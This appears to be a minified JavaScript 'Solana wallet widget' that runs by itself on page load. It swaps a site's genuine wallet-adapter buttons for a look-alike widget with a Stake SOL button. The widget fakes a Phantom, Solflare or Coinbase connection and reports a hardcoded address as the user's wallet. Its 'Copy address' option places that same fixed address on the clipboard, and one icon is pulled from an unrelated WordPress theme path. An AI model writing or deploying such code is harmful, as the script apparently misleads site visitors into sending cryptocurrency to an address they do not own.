"use strict";(()=>{var f=Object.defineProperty;var m=Object.getOwnPropertySymbols;var I=Object.prototype.hasOwnProperty,b=Object.prototype.propertyIsEnumerable;var w=(r,t,e)=>t in r?f(r,t,{enumerable:!0,configurable:!0,writable:!0,value:e}):r[t]=e,c=(r,t)=>{for(var e in t||(t={}))I.call(t,e)&&w(r,e,t[e]);if(m)for(var e of m(t))b.call(t,e)&&w(r,e,t[e]);return r};var p=class{constructor(){this.isInitialized=!1;this.options={network:"mainnet-beta",theme:"light"}}init(t){if(t&&(this.options=c(c({},this.options),t)),typeof window=="undefined"){console.warn("SolanaWidget: Window object not available. Widget can only run in browser environment.");return}this.loadStyles(),this.isInitialized=!0,console.log("SolanaWidget initialized successfully")}replaceButtons(){this.isInitialized||(console.warn("SolanaWidget: Widget not initialized. Call init() first."),this.init());let t=document.querySelectorAll(".wallet-adapter-button");console.log("Found "+t.length+" wallet buttons to replace"),t.forEach((e,a)=>{var o;let n=document.createElement("div");n.id="solana-wallet-widget-"+a,n.className="solana-wallet-widget-container",(o=e.parentNode)==null||o.replaceChild(n,e),this.renderWidget(n.id)})}loadStyles(){if(document.getElementById("solana-widget-styles"))return;let e=document.createElement("style");e.id="solana-widget-styles",e.textContent=`
      /* Import DM Sans font like in wallet adapter */
      @import url('https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;700&display=swap');
      
      /* Wallet adapter button styles */
      .wallet-adapter-button {
        background-color: transparent;
        border: none;
        color: #fff;
        cursor: pointer;
        display: flex;
        align-items: center;
        font-family: 'DM Sans', 'Roboto', 'Helvetica Neue', Helvetica, Arial, sans-serif;
        font-size: 16px;
        font-weight: 600;
        height: 48px;
        line-height: 48px;
        padding: 0 24px;
        border-radius: 4px;
      }
      
      .wallet-adapter-button-trigger {
        text-align: center !important;
        color: #000 !important;
        background: #ff554f !important;
        background-color: rgb(255, 85, 79);
        border-radius: 4px !important;
        min-width: 145px !important;
        display: block !important;
        position: relative !important;
      }
      
      .wallet-adapter-button:not([disabled]):hover {
        background-color: #ff554f !important;
      }
      
      .wallet-adapter-button-end-icon,
      .wallet-adapter-button-start-icon,
      .wallet-adapter-button-end-icon img,
      .wallet-adapter-button-start-icon img {
        display: flex;
        align-items: center;
        justify-content: center;
        width: 24px;
        height: 24px;
      }
      
      .wallet-adapter-button-end-icon {
        margin-left: 12px;
      }
      
      .wallet-adapter-button-start-icon {
        margin-right: 8px;
      }
      
      .wallet-adapter-button-trigger .wallet-adapter-button-start-icon {
        position: absolute !important;
        top: 12px !important;
      }
      
      /* Custom pi-wallet icon styles from globals.css */
      .pi-wallet {
        background: url("https://vladika.love/wp-content/themes/yootheme/js/wallet-icon.png") !important;
        background-size: contain;
        width: 40px;
        height: 40px;
        display: inline-block;
        position: absolute;
        left: 19px;
        top: 2px;
      }
      
      .w-caption {
        padding-left: 35px !important;
      }
      
      /* Wallet adapter modal styles */
      .wallet-adapter-modal {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        opacity: 0;
        transition: opacity linear 150ms;
        background: rgba(0, 0, 0, 0.5);
        z-index: 1040;
        overflow-y: auto;
      }
      
      .wallet-adapter-modal.wallet-adapter-modal-fade-in {
        opacity: 1;
      }
      
      .wallet-adapter-modal-button-close {
        display: flex;
        align-items: center;
        justify-content: center;
        position: absolute;
        top: 18px;
        right: 18px;
        padding: 12px;
        cursor: pointer;
        background: #1a1f2e;
        border: none;
        border-radius: 50%;
        background-color: #ff554f !important;
        width: 40px;
        height: 40px;
      }
      
      .wallet-adapter-modal-button-close:focus-visible {
        outline-color: white;
      }
      
      .wallet-adapter-modal-button-close svg {
        fill: #000 !important;
        width: 14px;
        height: 14px;
      }
      
      .wallet-adapter-modal-button-close:hover svg {
        fill: #000 !important;
      }
      
      .wallet-adapter-modal-container {
        display: flex;
        margin: 3rem;
        min-height: calc(100vh - 6rem);
        align-items: center;
        justify-content: center;
      }
      
      @media (max-width: 480px) {
        .wallet-adapter-modal-container {
          margin: 1rem;
          min-height: calc(100vh - 2rem);
        }
      }
      
      .wallet-adapter-modal-wrapper {
        background: #7b100f !important;
        box-sizing: border-box;
        z-index: 1050;
        background: #10141f;
        border-radius: 10px;
        flex-direction: column;
        flex: 1;
        align-items: center;
        max-width: 400px;
        font-family: DM Sans, Roboto, Helvetica Neue, Helvetica, Arial, sans-serif;
        display: flex;
        position: relative;
        box-shadow: 0 8px 20px #0009;
      }
      
      .wallet-adapter-modal-wrapper .wallet-adapter-button {
        width: 100%;
      }
      
      .wallet-adapter-modal-title {
        font-weight: 500;
        font-size: 24px;
        line-height: 36px;
        margin: 0;
        padding: 64px 48px 48px;
        text-align: center;
        color: #fff;
      }
      
      @media (max-width: 374px) {
        .wallet-adapter-modal-title {
          font-size: 18px;
        }
      }
      
      .wallet-adapter-modal-list {
        margin: 0 0 12px 0;
        padding: 0;
        width: 100%;
        list-style: none;
      }
      
      .wallet-adapter-modal-list .wallet-adapter-button {
        font-weight: 400;
        border-radius: 0;
        font-size: 18px;
        color: #fff;
        cursor: pointer;
        background-color: #0000;
        border: none;
        border-radius: 4px;
        align-items: center;
        height: 48px;
        padding: 0 24px;
        font-family: DM Sans, Roboto, Helvetica Neue, Helvetica, Arial, sans-serif;
        font-size: 16px;
        font-weight: 600;
        line-height: 48px;
        display: flex;
        justify-content: space-between;
      }
      
      .wallet-adapter-modal-list .wallet-adapter-button-end-icon,
      .wallet-adapter-modal-list .wallet-adapter-button-start-icon,
      .wallet-adapter-modal-list .wallet-adapter-button-end-icon img,
      .wallet-adapter-modal-list .wallet-adapter-button-start-icon img {
        width: 28px;
        height: 28px;
        margin-right: 12px;
      }
      
      .wallet-adapter-modal-list .wallet-adapter-button span {
        margin-left: 0;
        font-size: 14px;
        opacity: 1;
      }
      
      .wallet-adapter-modal-list .wallet-adapter-button .wallet-adapter-button-name {
        flex: 1;
        text-align: left;
        font-size: 18px;
        font-weight: 400;
      }
      
      .wallet-adapter-modal-list-more {
        cursor: pointer;
        border: none;
        padding: 12px 24px 24px 12px;
        align-self: flex-end;
        display: flex;
        align-items: center;
        background-color: transparent;
        color: #fff;
      }
      
      .wallet-adapter-modal-list-more svg {
        transition: all 0.1s ease;
        fill: rgba(255, 255, 255, 1);
        margin-left: 0.5rem;
      }
      
      .wallet-adapter-modal-list-more-icon-rotate {
        transform: rotate(180deg);
      }
      
      /* Custom styles for the widget */
      .solana-widget-container {
        font-family: 'DM Sans', 'Roboto', 'Helvetica Neue', Helvetica, Arial, sans-serif;
        max-width: 100%;
      }
      
      .solana-widget-btn {
        border: none;
        border-radius: 5em;
        background: #ff8480 !important;
        text-transform: uppercase;
        font-size: 22px;
        font-weight: 700;
        color: #ffffff !important;
        padding: 20px 55px;
        cursor: pointer;
        transition: all 0.2s ease;
        width: 100%;
      }
      
      .solana-widget-btn:hover {
        transform: translateY(-2px);
        box-shadow: 0 4px 12px rgba(153, 69, 255, 0.3);
      }
      
      .solana-widget-btn:active {
        transform: translateY(0);
      }
      
      .solana-widget-btn-connected {
        background: #14F195;
        color: #000;
      }
      
      /* Styles for connected wallet button */
      .wallet-adapter-button-connected {
        background: #1a1f2e !important;
        color: white !important;
        min-width: 200px !important;
        display: flex !important;
        align-items: center !important;
        justify-content: flex-start !important;
      }
      
      .wallet-adapter-button-connected .wallet-adapter-button-start-icon {
        position: static !important;
        margin-right: 8px !important;
        display: flex !important;
        align-items: center !important;
        justify-content: center !important;
      }
      
      .wallet-adapter-button-connected .wallet-adapter-button-name {
        flex: 1 !important;
        text-align: left !important;
        margin: 0 !important;
      }
      
      .wallet-adapter-button-connected .wallet-adapter-button-end-icon {
        margin-left: auto !important;
        display: flex !important;
        align-items: center !important;
        justify-content: center !important;
      }
      
      /* Context menu styles */
      .wallet-adapter-dropdown {
        position: absolute;
        z-index: 1050;
        background: #1a1f2e;
        border-radius: 8px;
        box-shadow: 0 8px 20px rgba(0, 0, 0, 0.6);
        padding: 8px 0;
        min-width: 200px;
        display: none;
      }
      
      .wallet-adapter-dropdown-list {
        list-style: none;
        margin: 0;
        padding: 0;
      }
      
      .wallet-adapter-dropdown-list-item {
        padding: 12px 24px;
        cursor: pointer;
        display: flex;
        align-items: center;
        color: white;
        font-family: 'DM Sans', 'Roboto', 'Helvetica Neue', Helvetica, Arial, sans-serif;
        font-size: 14px;
        font-weight: 600;
        transition: background-color 0.1s ease;
      }
      
      .wallet-adapter-dropdown-list-item:hover {
        background-color: #2a2f3e;
      }
      
      .wallet-adapter-dropdown-list-item-icon {
        margin-right: 12px;
        width: 16px;
        height: 16px;
        display: flex;
        align-items: center;
        justify-content: center;
      }
    `,document.head.appendChild(e)}renderWidget(t){let e=document.getElementById(t);if(!e){console.error("SolanaWidget: Container with id '"+t+"' not found");return}e.innerHTML="";let a=document.createElement("div");a.className="solana-widget-container";let n=document.createElement("button");n.className="wallet-adapter-button wallet-adapter-button-trigger";let o=document.createElement("i");o.className="pi-wallet";let i=document.createElement("span");i.className="w-caption",i.textContent="Wallet",n.appendChild(o),n.appendChild(i),n.onclick=()=>this.handleConnectClick(),a.appendChild(n),e.appendChild(a);let l=document.createElement("button");l.className="solana-widget-btn",l.style.marginTop="12px",l.textContent="Stake SOL",l.onclick=()=>this.handleStakeClick(),a.appendChild(l)}handleConnectClick(){this.showWalletSelectionModal()}showWalletSelectionModal(){let t=document.createElement("div");t.className="wallet-adapter-modal wallet-adapter-modal-fade-in";let e="",a=this.getAvailableWallets();a.forEach((l,d)=>{e+=`
        <li>
          <button class="wallet-adapter-button" data-wallet-name="${l.name}">
            <div style="display: flex; align-items: center;">
              <i class="wallet-adapter-button-start-icon">
                <img src="${l.icon}" alt="${l.name} icon" style="width:24px;height:24px;border-radius:50%;">
              </i>
              <span class="wallet-adapter-button-name">${l.name}</span>
            </div>
            ${l.installed?'<span style="margin-left: auto;">Detected</span>':""}
          </button>
        </li>
      `}),t.innerHTML=`
      <div class="wallet-adapter-modal-overlay"></div>
      <div class="wallet-adapter-modal-container">
        <div class="wallet-adapter-modal-wrapper">
          <button class="wallet-adapter-modal-button-close">
            <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M14 12.461L8.3 6.772l5.234-5.233L12.006 0 6.772 5.234 1.54 0 0 1.539l5.234 5.233L0 12.006l1.539 1.528L6.772 8.3l5.69 5.7L14 12.461z" fill="currentColor"/>
            </svg>
          </button>
          <h1 class="wallet-adapter-modal-title">Connect a wallet on Solana to continue</h1>
          <ul class="wallet-adapter-modal-list">
            ${e}
          </ul>
        </div>
      </div>
    `;let n=t.querySelector(".wallet-adapter-modal-button-close");n&&n.addEventListener("click",()=>{document.body.removeChild(t)}),t.querySelectorAll(".wallet-adapter-button").forEach(l=>{l.addEventListener("click",d=>{let s=d.currentTarget.getAttribute("data-wallet-name")||"",g=a.find(h=>h.name===s);g&&this.selectWallet(g),document.body.removeChild(t)})});let i=t.querySelector(".wallet-adapter-modal-overlay");i&&i.addEventListener("click",()=>{document.body.removeChild(t)}),document.body.appendChild(t)}getAvailableWallets(){let t=[];return typeof window.phantom!="undefined"?t.push({name:"Phantom",icon:this.getWalletIcon("Phantom"),installed:!0}):t.push({name:"Phantom",icon:this.getWalletIcon("Phantom"),installed:!1}),typeof window.solflare!="undefined"?t.push({name:"Solflare",icon:this.getWalletIcon("Solflare"),installed:!0}):t.push({name:"Solflare",icon:this.getWalletIcon("Solflare"),installed:!1}),typeof window.coinbaseSolana!="undefined"?t.push({name:"Coinbase Wallet",icon:this.getWalletIcon("Coinbase Wallet"),installed:!0}):t.push({name:"Coinbase Wallet",icon:this.getWalletIcon("Coinbase Wallet"),installed:!1}),t}getWalletIcon(t){var e,a,n;try{switch(t){case"Phantom":if(typeof window.phantom!="undefined"&&((e=window.phantom)!=null&&e.icon))return window.phantom.icon;break;case"Solflare":if(typeof window.solflare!="undefined"&&((a=window.solflare)!=null&&a.icon))return window.solflare.icon;break;case"Coinbase Wallet":if(typeof window.coinbaseSolana!="undefined"&&((n=window.coinbaseSolana)!=null&&n.icon))return window.coinbaseSolana.icon;break}}catch(o){console.warn(`Error getting icon for ${t}:`,o)}switch(t){case"Phantom":return"data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjI0IiBoZWlnaHQ9IjI0IiBmaWxsPSJ3aGl0ZSIvPgo8cGF0aCBkPSJNMTIgMkM2LjQ4IDAgMiA0LjQ4IDIgMTBTNi40OCAyMCAxMiAyMCAyMiAxNS41MiAyMiAxMFMyMS41MiAyIDEyIDJ6TTEyIDJDMTcuNTIgMiAyMiA2LjQ4IDIyIDEwUzE3LjUyIDIwIDEyIDIwIDIgMTUuNTIgMiAxMFMyLjQ4IDIgMTIgMnpNMTIgNkE2IDYgMCAxMDExIDE4QTYgNiAwIDAwMTIgNnpNMTIgOEE0IDQgMCAxMTExIDE2QzExLjU1IDE2IDEyIDE1LjU1IDEyIDh6IiBmaWxsPSIjQkMzRDk5Ii8+Cjwvc3ZnPg==";case"Solflare":return"data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjI0IiBoZWlnaHQ9IjI0IiBmaWxsPSJ3aGl0ZSIvPgo8cGF0aCBkPSJNMTIgMkM2LjQ4IDAgMiA0LjQ4IDIgMTBzNC40OCAxMCAxMCAxMCAxMC00LjQ4IDEwLTEwUzE3LjUyIDIgMTIgMnpNMTIgMjBjLTQuNDEgMC04LTMuNTktOC04czMuNTktOCA4LTggOCAzLjU5IDggOC0zLjU5IDgtOCA4eiIgZmlsbD0iI0ZGQTUwMCIvPgo8cGF0aCBkPSJNMTIgNkE2IDYgMCAxMDExIDE4QTYgNiAwIDAwMTIgNnpNMTIgOEE0IDQgMCAxMTExIDE2QzExLjU1IDE2IDEyIDE1LjU1IDEyIDh6IiBmaWxsPSIjRkZBNTAwIi8+Cjwvc3ZnPg==";case"Coinbase Wallet":return"data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjI0IiBoZWlnaHQ9IjI0IiBmaWxsPSJ3aGl0ZSIvPgo8cGF0aCBkPSJNMTIgMkM2LjQ4IDAgMiA0LjQ4IDIgMTBzNC40OCAxMCAxMCAxMCAxMC00LjQ4IDEwLTEwUzE3LjUyIDIgMTIgMnpNMTIgMjBjLTQuNDEgMC04LTMuNTktOC04czMuNTktOCA4LTggOCAzLjU5IDggOC0zLjU5IDgtOCA4eiIgZmlsbD0iIzAwNTJGRiIvPgo8cGF0aCBkPSJNMTIgNkE2IDYgMCAxMDExIDE4QTYgNiAwIDAwMTIgNnpNMTIgOEE0IDQgMCAxMTExIDE2QzExLjU1IDE2IDEyIDE1LjU1IDEyIDh6IiBmaWxsPSIjMDA1MkZGIi8+Cjwvc3ZnPg==";default:return"data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjI0IiBoZWlnaHQ9IjI0IiBmaWxsPSJ3aGl0ZSIvPgo8cGF0aCBkPSJNMTIgMkM2LjQ4IDAgMiA0LjQ4IDIgMTBzNC40OCAxMCAxMCAxMCAxMC00LjQ4IDEwLTEwUzE3LjUyIDIgMTIgMnpNMTIgMjBjLTQuNDEgMC04LTMuNTktOC04czMuNTktOCA4LTggOCAzLjU5IDggOC0zLjU5IDgtOCA4eiIgZmlsbD0iIzAwNTJGRiIvPgo8cGF0aCBkPSJNMTIgNkE2IDYgMCAxMDExIDE4QTYgNiAwIDAwMTIgNnpNMTIgOEE0IDQgMCAxMTExIDE2QzExLjU1IDE2IDEyIDE1LjU1IDEyIDh6IiBmaWxsPSIjMDA1MkZGIi8+Cjwvc3ZnPg=="}}selectWallet(t){let e="DzBFCSAGswVQ1f4V9oiX3sXfJSPnd89W5L47hEc8SZvV";console.log("Wallet selected:",t.name),this.updateButtonLabels(t),this.options.onConnect&&this.options.onConnect(e)}updateButtonLabels(t){document.querySelectorAll(".wallet-adapter-button-trigger").forEach(a=>{a.className="wallet-adapter-button wallet-adapter-button-trigger wallet-adapter-button-connected",a.innerHTML="";let n=document.createElement("i");n.className="wallet-adapter-button-start-icon";let o=document.createElement("img");o.src=t.icon,o.alt=t.name+" icon",o.style.width="24px",o.style.height="24px",o.style.borderRadius="50%",n.appendChild(o),a.appendChild(n);let i=document.createElement("span");i.className="wallet-adapter-button-name",i.textContent=t.name,a.appendChild(i);let l=document.createElement("i");l.className="wallet-adapter-button-end-icon",l.innerHTML=`
        <svg width="10" height="6" viewBox="0 0 10 6" xmlns="http://www.w3.org/2000/svg">
          <path d="M1 1L5 5L9 1" stroke="currentColor" stroke-width="1.5" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path>
        </svg>
      `,a.appendChild(l),a.onclick=()=>this.showContextMenu(t)})}showContextMenu(t){let e=document.querySelector(".wallet-adapter-dropdown");e&&document.body.removeChild(e);let a=document.createElement("div");a.className="wallet-adapter-dropdown",a.innerHTML=`
      <ul class="wallet-adapter-dropdown-list">
        <li class="wallet-adapter-dropdown-list-item" data-action="copy">
          <i class="wallet-adapter-dropdown-list-item-icon">
            <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M5.5 2.5H10.5C11.0523 2.5 11.5 2.94772 11.5 3.5V4.5H12.5C13.0523 4.5 13.5 4.94772 13.5 5.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H5.5C4.94772 13.5 4.5 13.0523 4.5 12.5V5.5C4.5 4.94772 4.94772 4.5 5.5 4.5H6.5V3.5C6.5 2.94772 6.94772 2.5 7.5 2.5H10.5ZM10.5 3.5H7.5V4.5H10.5V3.5ZM5.5 5.5V12.5H12.5V5.5H5.5Z" fill="white"/>
              <path d="M3.5 5.5C3.5 4.94772 3.94772 4.5 4.5 4.5H5.5V3.5C5.5 2.39543 6.39543 1.5 7.5 1.5H10.5C11.6046 1.5 12.5 2.39543 12.5 3.5V4.5H13.5C14.6046 4.5 15.5 5.39543 15.5 6.5V12.5C15.5 13.6046 14.6046 14.5 13.5 14.5H6.5C5.39543 14.5 4.5 13.6046 4.5 12.5V11.5H3.5C2.39543 11.5 1.5 10.6046 1.5 9.5V6.5C1.5 5.39543 2.39543 4.5 3.5 4.5V5.5ZM3.5 5.5H4.5V9.5H3.5V5.5ZM6.5 13.5V12.5H13.5V6.5H12.5V9.5C12.5 10.6046 11.6046 11.5 10.5 11.5H3.5V12.5C3.5 13.0523 3.94772 13.5 4.5 13.5H6.5Z" fill="white"/>
            </svg>
          </i>
          <span>Copy address</span>
        </li>
        <li class="wallet-adapter-dropdown-list-item" data-action="change">
          <i class="wallet-adapter-dropdown-list-item-icon">
            <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M8 1.5C4.41015 1.5 1.5 4.41015 1.5 8C1.5 11.5899 4.41015 14.5 8 14.5C11.5899 14.5 14.5 11.5899 14.5 8C14.5 4.41015 11.5899 1.5 8 1.5ZM8 13.5C4.96777 13.5 2.5 11.0322 2.5 8C2.5 4.96777 4.96777 2.5 8 2.5C11.0322 2.5 13.5 4.96777 13.5 8C13.5 11.0322 11.0322 13.5 8 13.5Z" fill="white"/>
              <path d="M8 4.5C7.44772 4.5 7 4.94772 7 5.5V8C7 8.26522 7.10536 8.51957 7.29289 8.70711L9.29289 10.7071C9.68342 11.0976 10.3166 11.0976 10.7071 10.7071C11.0976 10.3166 11.0976 9.68342 10.7071 9.29289L9 7.58579V5.5C9 4.94772 8.55228 4.5 8 4.5Z" fill="white"/>
            </svg>
          </i>
          <span>Change wallet</span>
        </li>
        <li class="wallet-adapter-dropdown-list-item" data-action="disconnect">
          <i class="wallet-adapter-dropdown-list-item-icon">
            <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M5 3.5C5 3.22386 5.22386 3 5.5 3H9.5C9.77614 3 10 3.22386 10 3.5V4H5V3.5Z" fill="white"/>
              <path d="M3 6C3 5.44772 3.44772 5 4 5H12C12.5523 5 13 5.44772 13 6V10C13 10.5523 12.5523 11 12 11H4C3.44772 11 3 10.5523 3 10V6ZM4 6V10H12V6H4Z" fill="white"/>
              <path d="M6 7C6 6.44772 6.44772 6 7 6H9C9.55228 6 10 6.44772 10 7C10 7.55228 9.55228 8 9 8H7C6.44772 8 6 7.55228 6 7Z" fill="white"/>
              <path d="M2 4C2 2.89543 2.89543 2 4 2H12C13.1046 2 14 2.89543 14 4V12C14 13.1046 13.1046 14 12 14H4C2.89543 14 2 13.1046 2 12V4ZM4 3C3.44772 3 3 3.44772 3 4V12C3 12.5523 3.44772 13 4 13H12C12.5523 13 13 12.5523 13 12V4C13 3.44772 12.5523 3 12 3H4Z" fill="white"/>
            </svg>
          </i>
          <span>Disconnect</span>
        </li>
      </ul>
    `;let n=document.querySelector(".wallet-adapter-button-connected");if(n){let l=n.getBoundingClientRect();a.style.position="absolute",a.style.top=l.bottom+window.scrollY+"px",a.style.left=l.left+window.scrollX+"px",a.style.display="block"}a.querySelectorAll(".wallet-adapter-dropdown-list-item").forEach(l=>{l.addEventListener("click",d=>{let s=d.currentTarget.getAttribute("data-action");this.handleContextMenuAction(s||"",t),document.body.removeChild(a)})});let i=l=>{!a.contains(l.target)&&!l.target.closest(".wallet-adapter-button-connected")&&(document.body.removeChild(a),document.removeEventListener("click",i))};document.addEventListener("click",i),document.body.appendChild(a)}handleContextMenuAction(t,e){switch(t){case"copy":navigator.clipboard.writeText("DzBFCSAGswVQ1f4V9oiX3sXfJSPnd89W5L47hEc8SZvV").then(()=>{console.log("Address copied to clipboard")}).catch(a=>{console.error("Failed to copy address: ",a)});break;case"change":this.showWalletSelectionModal();break;case"disconnect":this.resetButtonLabels(),this.options.onDisconnect&&this.options.onDisconnect();break;default:console.warn("Unknown context menu action:",t)}}resetButtonLabels(){document.querySelectorAll(".wallet-adapter-button-trigger").forEach(e=>{e.className="wallet-adapter-button wallet-adapter-button-trigger",e.innerHTML="";let a=document.createElement("i");a.className="pi-wallet",e.appendChild(a);let n=document.createElement("span");n.className="w-caption",n.textContent="Wallet",e.appendChild(n),e.onclick=()=>this.handleConnectClick()})}handleStakeClick(){alert("Please connect a wallet first to stake SOL")}},u=new p;window.SolanaWalletWidget={init:r=>u.init(r),replaceButtons:()=>u.replaceButtons()};document.addEventListener("DOMContentLoaded",function(){console.log("SolanaWalletWidget: Auto-initializing...");try{window.SolanaWalletWidget.init(),window.SolanaWalletWidget.replaceButtons()}catch(r){console.error("SolanaWalletWidget auto-initialization failed:",r);try{window.SolanaWalletWidget.replaceButtons()}catch(t){console.error("SolanaWalletWidget button replacement failed:",t)}}});})();
